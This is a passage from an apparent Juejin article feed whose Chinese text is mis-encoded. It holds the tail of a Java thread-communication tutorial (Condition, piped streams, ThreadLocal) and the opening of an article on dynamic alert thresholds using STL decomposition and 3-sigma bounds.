    notEmpty.signal();  <span class="hljs-comment">// é€šçŸ¥æ¶ˆè´¹è€…</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}

<span class="hljs-comment">// æ¶ˆè´¹è€…ï¼šç­‰å¾…ä¸ç©ºæ¡ä»¶ï¼Œé€šçŸ¥ä¸æ»¡æ¡ä»¶</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">while</span> (count == <span class="hljs-number">0</span>)
        notEmpty.await();
    <span class="hljs-comment">// æ¶ˆè´¹...</span>
    notFull.signal();  <span class="hljs-comment">// é€šçŸ¥ç”Ÿäº§è€…</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>æ›´ç²¾ç¡®çš„çº¿ç¨‹å”¤é†’æ§åˆ¶</li>
<li>é¿å…ä¸å¿…è¦çš„å”¤é†’</li>
<li>æé«˜æ€§èƒ½</li>
</ul>
<h3 data-id="heading-227">10.3 ç®¡é“é€šä¿¡</h3>
<h4 data-id="heading-228">PipedInputStream/PipedOutputStream</h4>
<p><strong>ç®¡é“ç”¨äºçº¿ç¨‹é—´çš„å­—èŠ‚æµé€šä¿¡ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">PipedInputStream</span> <span class="hljs-variable">pis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PipedInputStream</span>();
<span class="hljs-type">PipedOutputStream</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PipedOutputStream</span>();
pis.connect(pos);  <span class="hljs-comment">// è¿æ¥è¾“å…¥è¾“å‡ºæµ</span>

<span class="hljs-comment">// ç”Ÿäº§è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    pos.write(<span class="hljs-string">"æ•°æ®"</span>.getBytes());
    pos.close();
}).start();

<span class="hljs-comment">// æ¶ˆè´¹è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">int</span> data;
    <span class="hljs-keyword">while</span> ((data = pis.read()) != -<span class="hljs-number">1</span>) {
        System.out.print((<span class="hljs-type">char</span>) data);
    }
    pis.close();
}).start();
</code></pre>
<h4 data-id="heading-229">PipedReader/PipedWriter</h4>
<p><strong>ç®¡é“ç”¨äºçº¿ç¨‹é—´çš„å­—ç¬¦æµé€šä¿¡ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">PipedReader</span> <span class="hljs-variable">pr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PipedReader</span>();
<span class="hljs-type">PipedWriter</span> <span class="hljs-variable">pw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PipedWriter</span>();
pr.connect(pw);  <span class="hljs-comment">// è¿æ¥è¯»å†™å™¨</span>

<span class="hljs-comment">// ç”Ÿäº§è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    pw.write(<span class="hljs-string">"æ¶ˆæ¯"</span>);
    pw.close();
}).start();

<span class="hljs-comment">// æ¶ˆè´¹è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">int</span> data;
    <span class="hljs-keyword">while</span> ((data = pr.read()) != -<span class="hljs-number">1</span>) {
        System.out.print((<span class="hljs-type">char</span>) data);
    }
    pr.close();
}).start();
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li>ç®¡é“æ˜¯é˜»å¡çš„ï¼Œå¦‚æœç¼“å†²åŒºæ»¡ï¼Œå†™æ“ä½œä¼šé˜»å¡</li>
<li>å¦‚æœç¼“å†²åŒºç©ºï¼Œè¯»æ“ä½œä¼šé˜»å¡</li>
<li>é€‚åˆä¸€å¯¹ä¸€çš„çº¿ç¨‹é€šä¿¡</li>
</ul>
<h3 data-id="heading-230">10.4 çº¿ç¨‹é—´æ•°æ®å…±äº«</h3>
<h4 data-id="heading-231">ThreadLocal</h4>
<p><strong>ThreadLocalä¸ºæ¯ä¸ªçº¿ç¨‹æä¾›ç‹¬ç«‹çš„å˜é‡å‰¯æœ¬ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">ThreadLocal&lt;Integer&gt; threadLocal = ThreadLocal.withInitial(() -&gt; <span class="hljs-number">0</span>);

<span class="hljs-comment">// æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„å‰¯æœ¬</span>
<span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> threadLocal.get();
threadLocal.set(value + <span class="hljs-number">1</span>);
threadLocal.remove();  <span class="hljs-comment">// ä½¿ç”¨å®Œåè®°å¾—ç§»é™¤ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼</span>
</code></pre>
<p><strong>ThreadLocalçš„åº”ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>ç”¨æˆ·ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼ˆç”¨æˆ·IDã€æƒé™ç­‰ï¼‰</li>
<li>æ•°æ®åº“è¿æ¥</li>
<li>æ—¥æœŸæ ¼å¼åŒ–å™¨</li>
<li>é¿å…å‚æ•°ä¼ é€’</li>
</ul>
<h4 data-id="heading-232">InheritableThreadLocal</h4>
<p><strong>InheritableThreadLocalå…è®¸å­çº¿ç¨‹ç»§æ‰¿çˆ¶çº¿ç¨‹çš„ThreadLocalå€¼ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">InheritableThreadLocal&lt;String&gt; threadLocal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InheritableThreadLocal</span>&lt;&gt;();

threadLocal.set(<span class="hljs-string">"çˆ¶çº¿ç¨‹çš„å€¼"</span>);

<span class="hljs-type">Thread</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-comment">// å­çº¿ç¨‹å¯ä»¥è®¿é—®çˆ¶çº¿ç¨‹çš„å€¼</span>
    System.out.println(threadLocal.get());
});
child.start();
</code></pre>
<h4 data-id="heading-233">çº¿ç¨‹é—´æ•°æ®ä¼ é€’</h4>
<p><strong>æ–¹å¼1ï¼šé€šè¿‡æ„é€ æ–¹æ³•ä¼ é€’</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">"æ•°æ®1"</span>;
    <span class="hljs-comment">// å¤„ç†æ•°æ®</span>
}).start();
</code></pre>
<p><strong>æ–¹å¼2ï¼šé€šè¿‡å…±äº«å˜é‡ä¼ é€’</strong></p>
<pre><code class="hljs language-java" lang="java">BlockingQueue&lt;String&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;();
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; queue.put(<span class="hljs-string">"æ•°æ®"</span>)).start();
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; queue.take()).start();
</code></pre>
<p><strong>æ–¹å¼3ï¼šé€šè¿‡å›è°ƒå‡½æ•°ä¼ é€’</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> processData();
    callback.onComplete(result);
}).start();
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŠ¨æ€é˜ˆå€¼ï¼šè®©å‘Šè­¦ç³»ç»Ÿå…·å¤‡è‡ªæˆ‘å­¦ä¹ èƒ½åŠ›çš„æ·±åº¦å®è·µ]]></title>    <link>https://juejin.cn/post/7592451588848156691</link>    <guid>https://juejin.cn/post/7592451588848156691</guid>    <pubDate>2026-01-08T01:23:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592451588848156691" data-draft-id="7592088192517046315" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŠ¨æ€é˜ˆå€¼ï¼šè®©å‘Šè­¦ç³»ç»Ÿå…·å¤‡è‡ªæˆ‘å­¦ä¹ èƒ½åŠ›çš„æ·±åº¦å®è·µ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-08T01:23:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Ericinfra"/> <meta itemprop="url" content="https://juejin.cn/user/673352553084029"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŠ¨æ€é˜ˆå€¼ï¼šè®©å‘Šè­¦ç³»ç»Ÿå…·å¤‡è‡ªæˆ‘å­¦ä¹ èƒ½åŠ›çš„æ·±åº¦å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/673352553084029/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Ericinfra
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:23:47.000Z" title="Thu Jan 08 2026 01:23:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»30åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å‡Œæ™¨2ç‚¹ï¼Œè¿ç»´å·¥ç¨‹å¸ˆå°åˆ˜çš„æ‰‹æœºå†æ¬¡å“èµ·åˆºè€³çš„å‘Šè­¦é“ƒå£°ã€‚è¿™å·²ç»æ˜¯æœ¬å‘¨ç¬¬16æ¬¡æ·±å¤œå‘Šè­¦äº†ã€‚ä»–ç–²æƒ«åœ°æ‰“å¼€ç›‘æ§å¹³å°ï¼Œå‘ç°CPUä½¿ç”¨ç‡è¾¾åˆ°äº†85%â€”â€”è§¦å‘äº†å›ºå®šé˜ˆå€¼80%çš„å‘Šè­¦è§„åˆ™ã€‚ç„¶è€Œï¼ŒæŸ¥çœ‹å†å²æ•°æ®åä»–å‘ç°ï¼Œè¿™ä¸ªæ—¶æ®µæ­£æ˜¯ä¸šåŠ¡é«˜å³°æœŸï¼Œ85%çš„CPUä½¿ç”¨ç‡å®Œå…¨åœ¨æ­£å¸¸èŒƒå›´å†…ã€‚</p>
<p>è¿™ä¸æ˜¯ä¸ªä¾‹ã€‚æ ¹æ®Gartnerçš„è°ƒç ”æŠ¥å‘Šï¼Œä¼ä¸šITè¿ç»´å›¢é˜Ÿå¹³å‡æ¯å¤©æ”¶åˆ°æ•°ç™¾æ¡å‘Šè­¦ï¼Œä½†å…¶ä¸­è¶…è¿‡70%æ˜¯è¯¯æŠ¥æˆ–æ— éœ€å¤„ç†çš„å™ªéŸ³ã€‚è¿™ç§"ç‹¼æ¥äº†"ç»¼åˆå¾ä¸ä»…æ¶ˆè€—äº†å¤§é‡äººåŠ›ï¼Œæ›´ä¸¥é‡çš„æ˜¯ï¼šå½“çœŸæ­£çš„æ•…éšœå‘ç”Ÿæ—¶ï¼Œå‘Šè­¦å¾€å¾€æ·¹æ²¡åœ¨å™ªéŸ³ä¸­è¢«å¿½è§†ã€‚</p>
<p>ä¼ ç»Ÿå›ºå®šé˜ˆå€¼å‘Šè­¦ç³»ç»Ÿçš„æ ¸å¿ƒé—®é¢˜åœ¨äºï¼šå®ƒæ— æ³•ç†è§£ä¸šåŠ¡çš„åŠ¨æ€ç‰¹æ€§ã€‚ä¸šåŠ¡ç³»ç»Ÿçš„è´Ÿè½½å…·æœ‰æ˜æ˜¾çš„æ—¶é—´å‘¨æœŸæ€§ï¼ˆå·¥ä½œæ—¥vså‘¨æœ«ã€ç™½å¤©vså¤œæ™šï¼‰ã€å¢é•¿è¶‹åŠ¿æ€§ï¼ˆç”¨æˆ·é‡æŒç»­å¢é•¿ï¼‰ä»¥åŠçªå‘æ€§ï¼ˆä¿ƒé”€æ´»åŠ¨ã€çƒ­ç‚¹äº‹ä»¶ï¼‰ã€‚ç”¨ä¸€ä¸ªé™æ€çš„æ•°å€¼å»è¡¡é‡è¿™æ ·ä¸€ä¸ªåŠ¨æ€ç³»ç»Ÿï¼Œå¿…ç„¶ä¼šäº§ç”Ÿå¤§é‡çš„è¯¯åˆ¤ã€‚</p>
<p>æœ¬æ–‡å°†æ·±å…¥æ¢è®¨å¦‚ä½•æ„å»ºä¸€ä¸ªå…·å¤‡è‡ªæˆ‘å­¦ä¹ èƒ½åŠ›çš„åŠ¨æ€é˜ˆå€¼å‘Šè­¦ç³»ç»Ÿï¼Œä»ç†è®ºåŸºç¡€åˆ°å·¥ç¨‹å®è·µï¼Œå¸®åŠ©ä½ å½»åº•è§£å†³å‘Šè­¦ç–²åŠ³é—®é¢˜ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ç†è§£é—®é¢˜æœ¬è´¨ï¼šä¸ºä»€ä¹ˆå›ºå®šé˜ˆå€¼ä¼šå¤±æ•ˆï¼Ÿ</h2>
<h3 data-id="heading-1">1.1 ä¸šåŠ¡ç³»ç»Ÿçš„ä¸‰å¤§åŠ¨æ€ç‰¹å¾</h3>
<p>å‘¨æœŸæ€§ï¼ˆSeasonalityï¼‰</p>
<ul>
<li>æ—¥å‘¨æœŸï¼šç”µå•†ç³»ç»Ÿåœ¨æ™šä¸Š8-10ç‚¹æµé‡è¾¾åˆ°å³°å€¼</li>
<li>å‘¨å‘¨æœŸï¼šB2Bç³»ç»Ÿå‘¨æœ«æµé‡éª¤é™</li>
<li>å¹´å‘¨æœŸï¼šæ—…æ¸¸ç½‘ç«™åœ¨èŠ‚å‡æ—¥æµé‡æš´å¢</li>
</ul>
<p>è¶‹åŠ¿æ€§ï¼ˆTrendï¼‰</p>
<ul>
<li>ä¸šåŠ¡å¢é•¿ï¼šç”¨æˆ·é‡ä»10ä¸‡å¢é•¿åˆ°100ä¸‡ï¼ŒåŸºçº¿è´Ÿè½½æŒç»­ä¸Šå‡</li>
<li>ç³»ç»Ÿä¼˜åŒ–ï¼šä»£ç é‡æ„åèµ„æºæ¶ˆè€—ä¸‹é™</li>
<li>å®¹é‡æ‰©å±•ï¼šå¢åŠ æœåŠ¡å™¨åå•æœºè´Ÿè½½é™ä½</li>
</ul>
<p>éšæœºæ³¢åŠ¨ï¼ˆNoiseï¼‰</p>
<ul>
<li>æ­£å¸¸çš„ä¸šåŠ¡æŠ–åŠ¨</li>
<li>ç½‘ç»œå»¶è¿Ÿçš„éšæœºæ€§</li>
<li>ç³»ç»Ÿè°ƒåº¦çš„ä¸ç¡®å®šæ€§</li>
</ul>
<h3 data-id="heading-2">1.2 å›ºå®šé˜ˆå€¼çš„ä¸‰å¤§å›°å¢ƒ</h3>
<p>å›°å¢ƒä¸€ï¼šé˜ˆå€¼è®¾ç½®çš„ä¸¤éš¾é€‰æ‹©</p>
<p>è®¾ç½®è¿‡é«˜ â†’ çœŸå®æ•…éšœæ— æ³•åŠæ—¶å‘ç° â†’ ä¸šåŠ¡æŸå¤± è®¾ç½®è¿‡ä½ â†’ å¤§é‡è¯¯æŠ¥ â†’ å‘Šè­¦ç–²åŠ³ â†’ çœŸå®å‘Šè­¦è¢«å¿½è§†</p>
<p>å›°å¢ƒäºŒï¼šæ— æ³•é€‚åº”ä¸šåŠ¡å˜åŒ– æŸç”µå•†å¹³å°çš„çœŸå®æ¡ˆä¾‹ï¼š</p>
<ul>
<li>2022å¹´Q1ï¼šæ—¥å‡è®¢å•10ä¸‡ï¼ŒCPUé˜ˆå€¼è®¾ä¸º70%</li>
<li>2023å¹´Q1ï¼šæ—¥å‡è®¢å•50ä¸‡ï¼Œä½†é˜ˆå€¼ä»æ˜¯70%</li>
<li>ç»“æœï¼šæ¯å¤©è§¦å‘æ•°ç™¾æ¬¡å‘Šè­¦ï¼Œä½†éƒ½æ˜¯"æ­£å¸¸çš„é«˜è´Ÿè½½"</li>
</ul>
<p>å›°å¢ƒä¸‰ï¼šå¿½è§†æ—¶é—´ç»´åº¦ åŒæ ·æ˜¯CPU 80%ï¼š</p>
<ul>
<li>å‡Œæ™¨3ç‚¹ â†’ å¯èƒ½æ˜¯å¼‚å¸¸ä»»åŠ¡</li>
<li>æ™šä¸Š8ç‚¹ â†’ å¯èƒ½æ˜¯æ­£å¸¸é«˜å³°</li>
<li>å›ºå®šé˜ˆå€¼æ— æ³•åŒºåˆ†è¿™ä¸¤ç§åœºæ™¯</li>
</ul>
<h2 data-id="heading-3">äºŒã€åŠ¨æ€é˜ˆå€¼çš„ç†è®ºåŸºç¡€</h2>
<h3 data-id="heading-4">2.1 æ ¸å¿ƒæ€æƒ³ï¼šä»"ç»å¯¹å€¼åˆ¤æ–­"åˆ°"ç›¸å¯¹åç¦»åˆ¤æ–­"</h3>
<p>ä¼ ç»Ÿæ–¹æ³•ï¼š</p>
<pre><code class="hljs language-css" lang="css">if current_value &gt; FIXED_THRESHOLD:
    <span class="hljs-built_in">trigger_alert</span>()
</code></pre>
<p>åŠ¨æ€é˜ˆå€¼æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">expected_value = <span class="hljs-built_in">predict_based_on_history</span>(timestamp)
deviation = <span class="hljs-built_in">abs</span>(current_value - expected_value)
if deviation &gt; dynamic_threshold:
    <span class="hljs-built_in">trigger_alert</span>()
</code></pre>
<p>å…³é”®è½¬å˜ï¼šä¸å†åˆ¤æ–­æŒ‡æ ‡çš„ç»å¯¹å€¼ï¼Œè€Œæ˜¯åˆ¤æ–­å½“å‰å€¼ç›¸å¯¹äº"é¢„æœŸå€¼"çš„åç¦»ç¨‹åº¦ã€‚</p>
<h3 data-id="heading-5">2.2 æ—¶é—´åºåˆ—åˆ†è§£ï¼šSTLæ–¹æ³•</h3>
<p>STLï¼ˆSeasonal and Trend decomposition using Loessï¼‰æ˜¯ä¸€ç§å¼ºå¤§çš„æ—¶é—´åºåˆ—åˆ†è§£æ–¹æ³•ï¼Œå®ƒå°†è§‚æµ‹å€¼åˆ†è§£ä¸ºä¸‰ä¸ªç»„æˆéƒ¨åˆ†ï¼š Y(t) = T(t) + S(t) + R(t)</p>
<ul>
<li>T(t) - è¶‹åŠ¿é¡¹ï¼ˆTrendï¼‰ï¼šåæ˜ é•¿æœŸå˜åŒ–æ–¹å‘</li>
<li>S(t) - å­£èŠ‚é¡¹ï¼ˆSeasonalï¼‰ï¼šåæ˜ å‘¨æœŸæ€§æ³¢åŠ¨</li>
<li>R(t) - æ®‹å·®é¡¹ï¼ˆResidualï¼‰ï¼šå»é™¤è¶‹åŠ¿å’Œå­£èŠ‚åçš„éšæœºæ³¢åŠ¨</li>
</ul>
<p>ä¸ºä»€ä¹ˆé€‰æ‹©STLï¼Ÿ</p>
<ol>
<li>é²æ£’æ€§å¼ºï¼šå¯¹å¼‚å¸¸å€¼ä¸æ•æ„Ÿ</li>
<li>çµæ´»æ€§é«˜ï¼šå­£èŠ‚å‘¨æœŸå¯è‡ªå®šä¹‰</li>
<li>å¯è§£é‡Šæ€§å¥½ï¼šåˆ†è§£ç»“æœç›´è§‚æ˜“æ‡‚</li>
</ol>
<h3 data-id="heading-6">2.3 ç»Ÿè®¡è¿‡ç¨‹æ§åˆ¶ï¼ˆSPCï¼‰ç†è®º</h3>
<p>å€Ÿé‰´å·¥ä¸šè´¨é‡ç®¡ç†ä¸­çš„æ§åˆ¶å›¾æ€æƒ³ï¼š</p>
<p>3ÏƒåŸåˆ™ï¼š</p>
<ul>
<li>æ­£æ€åˆ†å¸ƒä¸‹ï¼Œ99.7%çš„æ•°æ®è½åœ¨ Î¼Â±3Ïƒ èŒƒå›´å†…</li>
<li>è¶…å‡ºæ­¤èŒƒå›´çš„æ•°æ®ç‚¹è¢«è§†ä¸º"å¼‚å¸¸"</li>
</ul>
<p>åŠ¨æ€é˜ˆå€¼è®¡ç®—å…¬å¼ï¼š Upper_Bound(t) = T(t) + S(t) + 3 Ã— Ïƒ(R) Lower_Bound(t) = T(t) + S(t) - 3 Ã— Ïƒ(R) å…¶ä¸­ ÏƒÂ® æ˜¯æ®‹å·®çš„æ ‡å‡†å·®ï¼Œåæ˜ äº†"æ­£å¸¸æ³¢åŠ¨"çš„å¹…åº¦ã€‚</p>
<h2 data-id="heading-7">ä¸‰ã€å·¥ç¨‹å®ç°ï¼šæ„å»ºç”Ÿäº§çº§åŠ¨æ€é˜ˆå€¼ç³»ç»Ÿ</h2>
<h3 data-id="heading-8">3.1 ç³»ç»Ÿæ¶æ„è®¾è®¡</h3>
<pre><code class="hljs language-markdown" lang="markdown">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ æ•°æ®é‡‡é›†å±‚  â”‚ â† Prometheus/InfluxDB
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">       â”‚
â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
â”‚ æ•°æ®é¢„å¤„ç†  â”‚ â† å¼‚å¸¸å€¼è¿‡æ»¤ã€ç¼ºå¤±å€¼å¡«å……
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚
â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
â”‚ é˜ˆå€¼è®¡ç®—å¼•æ“â”‚ â† STLåˆ†è§£ + åŠ¨æ€é˜ˆå€¼ç”Ÿæˆ
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚
â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
â”‚ å‘Šè­¦å†³ç­–å±‚  â”‚ â† å¤šç»´åº¦åˆ¤æ–­ + å‘Šè­¦æŠ‘åˆ¶
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚
â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
â”‚ å‘Šè­¦è¾“å‡ºå±‚  â”‚ â† é’‰é’‰/é‚®ä»¶/PagerDuty
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</span></code></pre>
<h3 data-id="heading-9">3.2 æ ¸å¿ƒä»£ç å®ç°ä¸è¯¦è§£</h3>
<h3 data-id="heading-10">3.2.1 å®Œæ•´çš„åŠ¨æ€é˜ˆå€¼ç”Ÿæˆå™¨</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> statsmodels.tsa.seasonal <span class="hljs-keyword">import</span> STL
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta
<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque
<span class="hljs-keyword">import</span> logging

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicThresholdGenerator</span>:
    <span class="hljs-string">"""
    åŠ¨æ€é˜ˆå€¼ç”Ÿæˆå™¨
    
    æ ¸å¿ƒåŠŸèƒ½ï¼š
